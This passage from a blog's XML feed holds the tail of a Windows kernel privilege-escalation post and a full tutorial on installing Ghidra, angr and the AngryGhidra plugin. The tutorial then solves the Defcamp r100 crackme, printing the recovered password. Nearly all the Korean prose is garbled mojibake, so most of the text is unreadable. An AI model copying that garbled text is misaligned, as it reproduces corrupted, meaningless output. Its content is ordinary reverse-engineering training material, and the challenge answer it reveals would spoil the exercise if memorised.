ì´ë£¨ì–´ì§‘ë‹ˆë‹¤. ë”°ë¼ì„œ Windows 10 RS4 ì´ìƒì˜ ì»¤ë„ì—ì„œ í”„ë¡œì„¸ìŠ¤ í† í°ì˜ ê¶Œí•œ í•„ë“œë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>idioth</tag>
      
      <tag>ntoskrnl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] AngryGhidraë¥¼ ì‚¬ìš©í•´ë³´ì!</title>
    <link href="/2020/10/25/idioth/angryghidra/"/>
    <url>/2020/10/25/idioth/angryghidra/</url>
    
    <content type="html"><![CDATA[<p>í•˜ì§€ë©”ë§ˆì‹œë–¼! ë°˜ê°‘ìŠµë‹ˆë‹¤ ì˜¤ëŠ˜ë„ ë¨ë¨í•œ idiothì…ë‹ˆë‹¤.</p><p>ì˜¤ëŠ˜ ì†Œê°œí•´ë“œë¦´ íˆ´ì€ AngryGhidraë¼ëŠ” íˆ´ì…ë‹ˆë‹¤.</p><p>ëˆ„êµ°ê°€(?)ê°€ ì˜¬ë ¤ì¤€ ë§í¬ë¥¼ ë³´ê³  ì˜¤ ì´ê±° í¸í•˜ê² ëŠ”ë° í•œ ë²ˆ ì¨ë³¼ê¹Œ? í•˜ê³  ì¨ë´¤ë‹¤ê°€ ì‚¬ìš©í•´ë³¼ ë§Œí•œ ê°€ì¹˜ê°€ ìˆëŠ” ê²ƒ ê°™ì•„ì„œ ê¸€ì„ ì‘ì„±í•´ë´…ë‹ˆë‹¤.</p><p><a href="https://github.com/angr/angr">angr</a>ì— ëŒ€í•´ ì„¤ëª…í•´ë“œë¦¬ìë©´ ë°”ì´ë„ˆë¦¬ ë¶„ì„ì„ ë„ì™€ì£¼ëŠ” python ë¼ì´ë¸ŒëŸ¬ë¦¬ì…ë‹ˆë‹¤.</p><p>ê¸°ì¡´ angrë¥¼ ì‚¬ìš©í•˜ë ¤ë©´ IDAì™€ ê°™ì€ íˆ´ì„ ì‚¬ìš©í•˜ì—¬ ë¶„ì„í•˜ê³  ì£¼ì†Œë¥¼ êµ¬í•˜ê³  python ì½”ë“œì—ë‹¤ê°€ ì ê³ â€¦ ë‹¤ì‹œ êµ¬í•˜ê³  ì½”ë“œì—ë‹¤ê°€ ì ê³  í•˜ëŠ” ë…¸ê°€ë‹¤ë¥¼ ì§„í–‰í•´ì•¼ í–ˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ ë…€ì„ì„ ì‚¬ìš©í•˜ë©´ Ghidraì—ì„œ ë¶„ì„í•˜ê³  í´ë¦­ì§ˆë§Œ ëª‡ ë²ˆ í•˜ë©´ angrì˜ ê¸°ëŠ¥ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì €ë… ë¨¹ê³  ì™€ì„œ ê³µë¶€ë„ í•˜ê¸° ì‹«ê² ë‹¤â€¦ ìš”ê±°ë‚˜ ì„¸íŒ…í•´ì„œ ì¨ë³´ë©´ì„œ ê°–ê³  ë†€ì•„ë´ì•¼ê² ë‹¤â€¦ íˆíˆíˆ í•˜ëŠ” ìƒê°ì€ 30ë¶„ ë§Œì— ê¹¨ì ¸ë²„ë¦¬ê²Œ ë©ë‹ˆë‹¤.</p><h1 id="ì˜ˆìƒì¹˜-ëª»í•œ-ì‚½ì§ˆ"><a href="#ì˜ˆìƒì¹˜-ëª»í•œ-ì‚½ì§ˆ" class="headerlink" title="ì˜ˆìƒì¹˜ ëª»í•œ ì‚½ì§ˆ"></a>ì˜ˆìƒì¹˜ ëª»í•œ ì‚½ì§ˆ</h1><p>ë¶„ëª… Readme.mdì—ì„œëŠ” ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ì„¤ì¹˜í•˜ì—¬ Extension ì¶”ê°€í•˜ë©´ ëœë‹¤ í–ˆë‹¤.</p><p>â†’ ê·¼ë° ì™œ ë¦´ë¦¬ì¦ˆ ë²„ì „ì´ ì•„ë¬´ê²ƒë„ ì—†ëŠ” ê±°ì§€? í•¨ì •ì¸ê°€</p><p>ê·¸ëƒ¥ git cloneí•˜ë©´ ë¹Œë“œ ëœ íŒŒì¼ì´ ìˆì„ ê±°ë¼ ìƒê°í•˜ì˜€ìœ¼ë‚˜ ì—†ì—ˆë‹¤.</p><p>â†’ cloneí•˜ê³  ìˆëŠ” íŒŒì¼ë“¤ ì „ë¶€ë‹¤ Ghidra Extensionì—ì„œ í´ë¦­í•´ë´¤ìœ¼ë‚˜ ì˜¤ë¥˜ë§Œ ì—„ì²­ ëœ¸.. build.gradle íŒŒì¼ì´ ìˆìœ¼ë‹ˆ gradleë¡œ ë¹Œë“œë¥¼ í•´ë³´ì</p><p>gradleì„ í†µí•´ ë¹Œë“œë¥¼ í•˜ëŠ”ë° ì •ìƒì ìœ¼ë¡œ ë˜ì§ˆ ì•Šë„¤..?</p><p>â†’ ë‚´ê°€ ë­˜ í•˜ë ¤ í•  ë•Œë§ˆë‹¤ ì˜¤ë¥˜ê°€ ëœ¬ë‹¤â€¦ ì´ì¯¤ì—ì„œ ë©˜íƒˆì´ ë‚˜ê°€ì„œ í˜¼ì ëª¨ë‹ˆí„° ì•ì—ì„œ ìš•ì„ í•˜ê¸° ì‹œì‘</p><p>ìš°ì—¬ê³¡ì ˆ ì†ì—ì„œ ë¹Œë“œ ì„±ê³µ(!) í›„ ì‹ ë‚˜ì„œ L0chì—ê²Œ ì•¼ ë¹Œë“œ í–ˆë‹¤ ì´ì œ ëŒë ¤ë³¸ë‹¤ ì˜†ì—ì„œ ë”± ê¸°ë‹¤ë ¤ ã…‹ã…‹í•˜ê³  ì˜†ì— ì„¸ì›Œë’€ìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ê°€ì ¸ì˜¨ ë°”ì´ë„ˆë¦¬ë¥¼ ëŒë ¸ëŠ”ë° angrê°€ ëŒì•„ê°€ì§€ ì•Šì•˜ë‹¤â€¦</p><blockquote><p>L0ch æ—¥ : ì•„ë‹ˆ í˜• ëœë‹¤ë©´ì„œ ì•ˆë˜ì–ì•„ ë­ì•¼ ë¹¨ë¦¬ ë‹¤ì‹œ ì‚½ì§ˆí•´ìš”</p></blockquote><p><del>ë‚˜ìœë„˜</del> ì•„ë¬´íŠ¼ ì—¬ê¸°ì„œ ë©ˆì¶œ ìˆ˜ ì—†ìœ¼ë¯€ë¡œ angrë¥¼ ì¬ì„¤ì¹˜í•´ë³´ê³  python ë²„ì „ì´ ë¬¸ì  ê°€ ì‚½ì§ˆì„ ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤â€¦</p><p>ê²°êµ­ ë©˜íƒˆì´ ë°•ì‚´ ë‚œ ìƒíƒœë¡œ ì§‘ì— ê°€ì„œ ì• ë‹ˆë©”ì´ì…˜(?)ì„ ë³´ë©° íë§ í›„ ë‹¤ìŒ ë‚  ë‹¤ì‹œ ë„ì „ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤.</p><p>UE(User Error)ì¼ ê°€ëŠ¥ì„±ì´ í¬ë‹¤ê³  ìƒê°í•˜ë©° ì˜¤ëŠ˜ì˜ ë‚˜ì™€ ì–´ì œì˜ ë‚˜ëŠ” ë‹¤ë¥´ê¸° ë•Œë¬¸ì— ë˜ ëŒë ¸ëŠ”ë° ì‹¤í–‰ì´ ì•ˆ ëìŠµë‹ˆë‹¤.. ë„ëŒ€ì²´ ì™œ ì•ˆë¼?ë¼ê³  ìƒê°í•˜ëŠ” ì°°ë‚˜ ë‚´ ë¨¸ë¦¬ì— ìŠ¤ì¹œ ìƒê°</p><blockquote><p>ì•„ë‹ˆ ì´ê±° elf íŒŒì¼ì¸ë° ì™œ windowsì—ì„œ ëŒë¦¬ê³  ìˆì§€??</p></blockquote><p align="center"><img src="./img1.jpg" width=60% height=60%></p><p>ubuntuë¡œ ì˜®ê¸´ ë‹¤ìŒì— ë‹¤ì‹œ ìœ„ì˜ ê³¼ì • ë°˜ë³µ í›„ ë‹¤ì‹œ L0chë¥¼ ë¶ˆë €ìŠµë‹ˆë‹¤. ì´ ìì‹ì€ í˜•ì´ ë¶€ë¥´ëŠ”ë° ë§¨ë‚  íˆ¬ëœê±°ë ¤ìš”. â€œì•ˆë˜ê¸°ë§Œ í•´ ë´â€ í•˜ë©´ì„œ ì™€ë†“ê³  ë˜ë‹ˆê¹Œ ë”°ë´‰ ë‚ ë¦¬ê³  ê°‘ë‹ˆë‹¤.</p><p>í˜„ì¬ëŠ” Pre-releaseë¡œ AngryGhidra v0.1ì´ ì—…ë¡œë“œëœ ìƒíƒœë¼ì„œ ê·€ì°®ìœ¼ì‹  ë¶„ì€ <a href="https://github.com/Nalen98/AngryGhidra/releases">ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ë‹¤ìš´ë¡œë“œ</a> ë°›ì•„ Extensionì„ ë°”ë¡œ ì¶”ê°€í•˜ë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p><h1 id="ê·¼ë°-Ghidraê°€-ë­”ë°"><a href="#ê·¼ë°-Ghidraê°€-ë­”ë°" class="headerlink" title="ê·¼ë° Ghidraê°€ ë­”ë°?"></a>ê·¼ë° Ghidraê°€ ë­”ë°?</h1><p><a href="https://ghidra-sre.org/">Ghidra</a>ëŠ” NSAì—ì„œ ê°œë°œí•œ ì—­ì–´ì…ˆë¸”ëŸ¬ í”„ë ˆì„ì›Œí¬ì…ë‹ˆë‹¤. ë­ í•˜ëŠ” ë…€ì„ì¸ì§€ ì˜ ëª¨ë¥´ê² ìœ¼ë©´ IDA ê°™ì€ ë…€ì„ì´ë¼ê³  ë³´ì‹œë©´ ë©ë‹ˆë‹¤.</p><p>ì˜¤í”ˆ ì†ŒìŠ¤ë¡œ ê³µê°œë˜ì—ˆìœ¼ë©° jdk 11 ë²„ì „ì—ì„œ ì •ìƒì ìœ¼ë¡œ ì‘ë™ë©ë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ ì‘ìš© í”„ë¡œê·¸ë¨ë“¤ì²˜ëŸ¼ ì„¤ì¹˜ íŒŒì¼ì„ í†µí•´ ì„¤ì¹˜í•˜ëŠ” ê²ƒì´ ì•„ë‹Œ ì••ì¶• íŒŒì¼ì„ ë‹¤ìš´ ë°›ì•„ì„œ ì••ì¶•ë§Œ í•´ì œí•˜ë©´ ë°”ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì§€ì› í”Œë«í¼</p><ul><li>Windows 7 or 10 (64bit)</li><li>Linux (64bit, CentOs 7 is preferred)</li><li>macOS(OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32ë¹„íŠ¸ OSì—ì„œëŠ” Ghidraë¥¼ ì‚¬ìš©í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.</p><h2 id="ìš°ë¶„íˆ¬ì—-Ghidra-ì„¤ì¹˜í•˜ê¸°"><a href="#ìš°ë¶„íˆ¬ì—-Ghidra-ì„¤ì¹˜í•˜ê¸°" class="headerlink" title="ìš°ë¶„íˆ¬ì— Ghidra ì„¤ì¹˜í•˜ê¸°"></a>ìš°ë¶„íˆ¬ì— Ghidra ì„¤ì¹˜í•˜ê¸°</h2><h3 id="ìë°”-í™˜ê²½-ì„¤ì¹˜"><a href="#ìë°”-í™˜ê²½-ì„¤ì¹˜" class="headerlink" title="ìë°” í™˜ê²½ ì„¤ì¹˜"></a>ìë°” í™˜ê²½ ì„¤ì¹˜</h3><pre><code class="hljs bash">$ sudo add-apt-repository ppa:openjdk-r/ppa$ sudo apt install openjdk-11-jre openjdk-11-jre-headless openjdk-11-jdk openjdk-11-jdk-headless</code></pre><h3 id="Ghidra-ì„¤ì¹˜"><a href="#Ghidra-ì„¤ì¹˜" class="headerlink" title="Ghidra ì„¤ì¹˜"></a>Ghidra ì„¤ì¹˜</h3><p><a href="https://ghidra-sre.org/">ê¸°ë“œë¼ ì‚¬ì´íŠ¸</a>ì—ì„œ ìµœì‹  ë²„ì „ì˜ ê¸°ë“œë¼ë¥¼ ì„¤ì¹˜í•´ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img2.png"></p><p>ì„¤ì¹˜ í›„ ì›í•˜ëŠ” í´ë”ì—ì„œ ì••ì¶•ì„ í•´ì œí•˜ë©´ ghidraê°€ ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ë©ë‹ˆë‹¤.</p><pre><code class="hljs bash">idioth@ubuntu:~$ ls -al ghidra_9.1.2_PUBLICtotal 56drwxr-xr-x  9 idioth idioth  4096  9ì›” 11 15:15 .drwxr-xr-x 31 idioth idioth  4096  9ì›” 14 17:01 ..drwxr-xr-x  5 idioth idioth  4096  2ì›” 12  2020 docsdrwxr-xr-x  5 idioth idioth  4096  2ì›” 12  2020 Extensionsdrwxr-xr-x  8 idioth idioth  4096  2ì›” 12  2020 Ghidra-rwxr-xr-x  1 idioth idioth   883  2ì›” 12  2020 ghidraRun-rw-r--r--  1 idioth idioth   384  2ì›” 12  2020 ghidraRun.batdrwxr-xr-x  7 idioth idioth  4096  2ì›” 12  2020 GPL-rw-r--r--  1 idioth idioth 11357  2ì›” 12  2020 LICENSEdrwxr-xr-x  2 idioth idioth  4096  2ì›” 12  2020 licensesdrwxr-xr-x  2 idioth idioth  4096  2ì›” 12  2020 serverdrwxr-xr-x  2 idioth idioth  4096  2ì›” 12  2020 support</code></pre><p>Windowsì˜ ê²½ìš° ghidraRun.batë¥¼ í†µí•´ ì‹¤í–‰í•˜ê³  ìš°ë¶„íˆ¬ì˜ ê²½ìš° ghidraRunì„ í†µí•´ ì‹¤í–‰í•´ ì¤ë‹ˆë‹¤. ì‹¤í–‰ ê¶Œí•œì´ ì—†ì„ ê²½ìš° chmod +x ghidraRunì„ í†µí•´ ì‹¤í–‰ ê¶Œí•œì„ ì£¼ë©´ ë©ë‹ˆë‹¤.</p><h1 id="AngryGhidra"><a href="#AngryGhidra" class="headerlink" title="AngryGhidra"></a>AngryGhidra</h1><p>ê¸°ë“œë¼ê°€ ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ë˜ì—ˆë‹¤ë©´ <a href="https://github.com/Nalen98/AngryGhidra/releases">AngryGhidra</a>ë¥¼ ì„¤ì¹˜í•´ ì¤ë‹ˆë‹¤.</p><h2 id="Angr-ì„¤ì¹˜"><a href="#Angr-ì„¤ì¹˜" class="headerlink" title="Angr ì„¤ì¹˜"></a>Angr ì„¤ì¹˜</h2><pre><code class="hljs bash">$ sudo pip3 install angr</code></pre><h2 id="Releasesë¡œ-í”ŒëŸ¬ê·¸ì¸-ë“±ë¡"><a href="#Releasesë¡œ-í”ŒëŸ¬ê·¸ì¸-ë“±ë¡" class="headerlink" title="Releasesë¡œ í”ŒëŸ¬ê·¸ì¸ ë“±ë¡"></a>Releasesë¡œ í”ŒëŸ¬ê·¸ì¸ ë“±ë¡</h2><p>pre-releasesê°€ ì˜¬ë¼ì™”ìœ¼ë‹ˆ ì €ì™€ ê°™ì€ ì‹œê°„ ë‚­ë¹„(?)ëŠ” í•˜ì§€ ë§ê³  ë¦´ë¦¬ì¦ˆ ë²„ì „ìœ¼ë¡œ ë“±ë¡ì„ í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs bash">$ wget https://github.com/Nalen98/AngryGhidra/releases/download/0.1%2Bghidra-9.1.2/ghidra_9.1.2_PUBLIC_20200909_AngryGhidra.zip</code></pre><p>ë¦´ë¦¬ì¦ˆ ë²„ì „ì„ ì„¤ì¹˜í•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img3.png"></p><p>ê¸°ë“œë¼ ì‹¤í–‰ í›„ File-Install Extensionsì„ ì„ íƒí•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img4.png"></p><p>ìš°ì¸¡ ìƒë‹¨ì— +ë²„íŠ¼ì„ ì„ íƒí•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img5.png"></p><p>ì„¤ì¹˜ ë°›ì€ zip íŒŒì¼ì„ ì„ íƒí•´ ì¤€ í›„ ì²´í¬í•´ ì¤ë‹ˆë‹¤.</p><p>ê·¸ëŸ¬ë©´ ëë‚©ë‹ˆë‹¤. ì²´í¬í•˜ê³  OK ëˆ„ë¥´ë©´ ì„¤ì¹˜ ì™„ë£Œ~</p><h2 id="Gradleì„-í†µí•´ì„œ-ì§ì ‘-ë¹Œë“œí•˜ëŠ”-ë°©ë²•"><a href="#Gradleì„-í†µí•´ì„œ-ì§ì ‘-ë¹Œë“œí•˜ëŠ”-ë°©ë²•" class="headerlink" title="Gradleì„ í†µí•´ì„œ ì§ì ‘ ë¹Œë“œí•˜ëŠ” ë°©ë²•"></a>Gradleì„ í†µí•´ì„œ ì§ì ‘ ë¹Œë“œí•˜ëŠ” ë°©ë²•</h2><p>ë¦´ë¦¬ì¦ˆ ë²„ì „ì´ ì˜¬ë¼ì™€ ìˆê¸° ë•Œë¬¸ì— êµ³ì´ ì´ ë°©ë²•ì„ íƒí•˜ì‹œëŠ” ë¶„ì´ ì—†ì„ ê±°ë¼ ìƒê°í•˜ì§€ë§Œ í˜¹ì‹œ ë³¸ì¸ì´ ì§ì ‘ ë¹Œë“œ í•´ë³´ê³  ì‹¶ìœ¼ì‹œë‹¤ë©´ ì§ì ‘ ë¹Œë“œ í•´ë³´ì‹œëŠ” ê²ƒë„ ì¶”ì²œë“œë¦½ë‹ˆë‹¤.</p><pre><code class="hljs bash">$ sudo apt install gradle$ git <span class="hljs-built_in">clone</span> https://github.com/Nalen98/AngryGhidra</code></pre><p>gradleì„ í†µí•´ì„œ ë¹Œë“œ í•˜ê¸° ìœ„í•´ gradleì„ ì„¤ì¹˜í•˜ê³  AngryGhidra repositoryë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.</p><pre><code class="hljs bash">~/AngryGhidra$ gradle buildExtensionStarting a Gradle Daemon, 1 incompatible and 1 stopped Daemons could not be reused, use --status <span class="hljs-keyword">for</span> detailsFAILURE: Build failed with an exception.* Where:Build file <span class="hljs-string">&#x27;/home/idioth/AngryGhidra/build.gradle&#x27;</span> line: 31* What went wrong:A problem occurred evaluating root project <span class="hljs-string">&#x27;AngryGhidra&#x27;</span>.&gt; GHIDRA_INSTALL_DIR is not defined!* Try:Run with --stacktrace option to get the stack trace. Run with --info or --debug option to get more <span class="hljs-built_in">log</span> output. Run with --scan to get full insights.* Get more <span class="hljs-built_in">help</span> at https://help.gradle.orgBUILD FAILED <span class="hljs-keyword">in</span> 3s</code></pre><p>ê·¸ëƒ¥ ë¹Œë“œë¥¼ ì§„í–‰í•  ê²½ìš° ê¸°ë“œë¼ì˜ ì„¤ì¹˜ ê²½ë¡œë¥¼ ì•Œ ìˆ˜ ì—†ê¸° ë•Œë¬¸ì— ì •ìƒì ìœ¼ë¡œ ë¹Œë“œê°€ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì¢€ ë” ë˜‘ë˜‘í•œ(?) ì œê°€ ê°€ë¥´ì³ì£¼ë„ë¡ í•©ë‹ˆë‹¤.</p><pre><code class="hljs bash">~/AngryGhidra$ sudo GHIDRA_INSTALL_DIR=/home/idioth/ghidra_9.1.2_PUBLIC gradle buildExtension&gt; Task :buildHelp INFO  Using <span class="hljs-built_in">log</span> config file: jar:file:/home/idioth/ghidra_9.1.2_PUBLIC/Ghidra/Framework/Generic/lib/Generic.jar!/generic.log4j.xml (LoggingInitialization)  INFO  Using <span class="hljs-built_in">log</span> file: /root/.ghidra/.ghidra_9.1.2_PUBLIC/application.log (LoggingInitialization)  [JavaHelpFilesBuilder] Generating Help Files <span class="hljs-keyword">for</span>: [file:///home/idioth/AngryGhidra/src/main/<span class="hljs-built_in">help</span>/<span class="hljs-built_in">help</span>/][JavaHelpFilesBuilder] Generating map file: file:///home/idioth/AngryGhidra/build/<span class="hljs-built_in">help</span>/main/<span class="hljs-built_in">help</span>/AngryGhidra_map.xml...[JavaHelpFilesBuilder]  finished generating map file[JavaHelpFilesBuilder] Generating TOC file: AngryGhidra_TOC.xml...[JavaHelpFilesBuilder]  finished generating TOC file[JavaHelpFilesBuilder] Done generating <span class="hljs-built_in">help</span> files <span class="hljs-keyword">for</span> module: AngryGhidra&gt; Task :buildExtension Created ghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip <span class="hljs-keyword">in</span> /home/idioth/AngryGhidra/distBUILD SUCCESSFUL <span class="hljs-keyword">in</span> 15s8 actionable tasks: 8 executed</code></pre><p>ìœ„ì™€ ê°™ì´ ìì‹ ì˜ ê¸°ë“œë¼ ê²½ë¡œë¥¼ ì¶”ê°€í•´ ì¤€ í›„ ë¹Œë“œë¥¼ ì§„í–‰í•©ë‹ˆë‹¤. </p><pre><code class="hljs bash">~/AngryGhidra/dist$ lsghidra_9.1.2_PUBLIC_20200914_AngryGhidra.zip</code></pre><p>ì •ìƒì ìœ¼ë¡œ ë¹Œë“œê°€ ì§„í–‰ëë‹¤ë©´ dist í´ë”ì— Extension íŒŒì¼ì´ ìƒê¹ë‹ˆë‹¤.</p><p>ì—¬ê¸°ê¹Œì§€ ì˜¤ì…¨ë‹¤ë©´ ë¦´ë¦¬ì¦ˆë¥¼ í†µí•´ ì¶”ê°€í•˜ëŠ” ê²ƒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ì¶”ê°€í•˜ì‹œë©´ ë©ë‹ˆë‹¤!</p><h2 id="AngryGhidraë¥¼-í†µí•œ-ë¬¸ì œ-í’€ì´"><a href="#AngryGhidraë¥¼-í†µí•œ-ë¬¸ì œ-í’€ì´" class="headerlink" title="AngryGhidraë¥¼ í†µí•œ ë¬¸ì œ í’€ì´"></a>AngryGhidraë¥¼ í†µí•œ ë¬¸ì œ í’€ì´</h2><p>angrë¡œ í‘¸ëŠ” ë¬¸ì œ ì¤‘ ê°€ì¥ ê°„ë‹¨í•œ(?) <a href="https://github.com/ByteBandits/writeups/blob/master/defcamp-quals-2015/reverse/r100/r100.bin">Defcamp - r100</a>ì„ í†µí•´ì„œ ì–´ë–¤ ì‹ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ”ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p>ë¨¼ì € ê¸°ë“œë¼ë¡œ í•´ë‹¹ íŒŒì¼ì„ ì—´ì–´ì¤€ í›„ main ì†ŒìŠ¤ ì½”ë“œë¥¼ í™•ì¸í•´ë´…ì‹œë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_004007e8</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> *pcVar2;undefined8 uVar3;<span class="hljs-keyword">long</span> in_FS_OFFSET;<span class="hljs-keyword">char</span> local_118 [<span class="hljs-number">264</span>];<span class="hljs-keyword">long</span> local_10;local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter the password: &quot;</span>);pcVar2 = fgets(local_118, <span class="hljs-number">0xff</span>, <span class="hljs-built_in">stdin</span>);<span class="hljs-keyword">if</span> (pcVar2 == (<span class="hljs-keyword">char</span> *)<span class="hljs-number">0x0</span>) &#123;uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;iVar1 = FUN_004006fd(local_118);<span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">0</span>) &#123;put(<span class="hljs-string">&quot;Nice!&quot;</span>);uVar3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Incorrect password!&quot;</span>);uVar3 = <span class="hljs-number">1</span>;&#125;&#125;<span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;__stack_chk_fail();&#125;<span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>passwordë¥¼ ì…ë ¥ë°›ê³  <code>FUN_004006fd</code> í•¨ìˆ˜ì—ì„œ ì–´ë– í•œ ìˆ˜í–‰ì„ í•˜ê³  return ê°’ì— ë”°ë¼ì„œ Niceì™€ incorrectë¡œ ë„˜ì–´ê°€ë„¤ìš”.</p><p>Incorrect ë¶€ë¶„ì„ í”¼í•˜ê³  Niceë¡œ ê°€ëŠ” íŒ¨ìŠ¤ì›Œë“œë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.</p><p>ì € í•¨ìˆ˜ë¥¼ ì¼ì¼ì´ ë¶„ì„í•˜ëŠ” ë°©ë²•ë„ ìˆì§€ë§Œ ìš°ë¦¬ì—ê²ŒëŠ” AngryGhidraê°€ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img6.png"></p><p>ë¨¼ì € í•¨ìˆ˜ì˜ ì‹œì‘ ë¶€ë¶„ì—ì„œ blank stateë¥¼ ì„¤ì •í•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img7.png"></p><p>ìš°ë¦¬ëŠ” Nice ë¬¸ìì—´ ë¶€ë¶„ìœ¼ë¡œ ë„˜ì–´ê°€ëŠ” ê°’ì„ ì°¾ê³  ì‹¶ìœ¼ë‹ˆ Nice ìª½ìœ¼ë¡œ ë„˜ì–´ê°€ëŠ” ì£¼ì†Œë¥¼ Find Addressë¡œ ì„¤ì •í•´ ì¤ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img8.png"></p><p>Incorrectë¡œ ê°€ëŠ” ë¶€ë¶„ì€ í”¼í•´ì•¼ ë˜ë‹ˆ Avoid Addressë¡œ ì„¤ì •í•œ ë‹¤ìŒì— AngryGhidraë¥¼ ì‹¤í–‰í•´ë´…ì‹œë‹¤!</p><p><img src="/2020/10/25/idioth/angryghidra/img9.png"></p><p><img src="/2020/10/25/idioth/angryghidra/img10.png"></p><p>Window - AngryGhidraPluginì„ í´ë¦­í•˜ë©´ ìœ„ì˜ ì‚¬ì§„ê³¼ ê°™ì€ ì°½ì´ ëœ¹ë‹ˆë‹¤. ì¸ìì˜ ê¸¸ì´ë¥¼ ì§€ì •í•  ìˆ˜ë„ ìˆê³ , auto_load_libsë¥¼ ì„¤ì •í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p>Blank Stateì™€ Find address, avoid addressë¥¼ ëª¨ë‘ ì„¤ì •í•˜ì˜€ìœ¼ë‹ˆ Run ë²„íŠ¼ì„ ëˆŒëŸ¬ angrë¥¼ ëŒë ¤ë´…ì‹œë‹¤.</p><p>ì ì‹œ ê¸°ë‹¤ë ¤ë³´ë©´ Solution Foundë¼ê³  ëœ¨ë©° ì•„ë˜ì™€ ê°™ì´ ì–´ë–¤ ë¬¸ìì—´ì´ ëœ¹ë‹ˆë‹¤.</p><p><img src="/2020/10/25/idioth/angryghidra/img11.png"></p><p>ë‚˜ì˜¨ ë¬¸ìì—´ì„ ë°”ì´ë„ˆë¦¬ì— ì…ë ¥í•´ë³´ë©´</p><pre><code class="hljs bash">~/Desktop$ ./r100.bin Enter the password: Code_TalkersNice!</code></pre><p>ì •ìƒì ìœ¼ë¡œ ì°¾ì€ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë‚˜ëŠ” ì†ŒìŠ¤ ì½”ë“œ ë³´ê³  í´ë¦­ì§ˆë§Œ ëª‡ ë²ˆ í•˜ë©´ ê°’ì„ ì°¾ì•„ì¤€ë‹¤? ì •ë§ ì¸ê°„ì˜ ìš•êµ¬ì— ì¶©ì‹¤í•œ í”ŒëŸ¬ê·¸ì¸ì´ ì•„ë‹ ìˆ˜ê°€ ì—†ìŠµë‹ˆë‹¤.</p><p>ì§ì ‘ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•´ì„œ ëŒë¦¬ëŠ” ê²ƒì´ ê¸°ëŠ¥ì ìœ¼ë¡œëŠ” í›¨ì”¬ íš¨ìœ¨ì ì¼ ìˆ˜ ìˆì§€ë§Œ ë¦¬ë²„ì‹±ì„ ì§„í–‰í•˜ë©´ì„œ ë°”ë¡œë°”ë¡œ angr í™˜ê²½ ì„¸íŒ… ë° ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ëŠ” ì ì´ ë§¤ë ¥ì ì´ì—ˆìŠµë‹ˆë‹¤.</p><p>ì•„ì§ì€ ê°„ë‹¨í•œ ê²ƒë“¤ë¡œë§Œ í•´ë³´ê³  ë” ë³µì¡í•œ ê²ƒë“¤ì€ ì‚¬ìš©í•´ë³´ì§€ ì•Šì•˜ëŠ”ë° ë‚˜ì¤‘ì— ê¸°íšŒê°€ ëœë‹¤ë©´ ë” ë³µì¡í•œ ë°”ì´ë„ˆë¦¬ì— ì‚¬ìš©í•´ë³´ê³  ì˜¬ë ¤ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤ ã…‹ã…‹</p><p>ì˜¤ëŠ˜ë„ ì €ì˜ ë©ì²­í•¨ì„ í™•ì¸í•˜ê³  ê·¹ë³µí•œ ë‚˜ì—ê²Œ ê±´ë°°í•˜ë©°.. adios..</p><p align="center"><img src="./img12.jpg" width="50%" heightd="50%"></p>]]></content>
    
    
